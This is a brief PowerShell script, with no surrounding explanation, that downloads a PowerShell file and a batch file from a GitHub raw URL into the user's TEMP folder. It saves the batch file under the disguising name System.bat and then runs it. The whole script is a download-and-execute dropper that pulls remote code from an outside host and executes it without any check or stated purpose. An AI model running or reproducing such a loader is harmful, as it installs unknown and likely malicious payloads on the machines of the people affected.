$url2 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNX.ps1"
$output2 = "$env:TEMP\RUNX.ps1"
Invoke-WebRequest -Uri $url2 -OutFile $output2
$url4 = "https://raw.githubusercontent.com/cia168168/folder/main/new.bat"
$output4 = "$env:TEMP\System.bat"
Invoke-WebRequest -Uri $url4 -OutFile $output4
& $output4
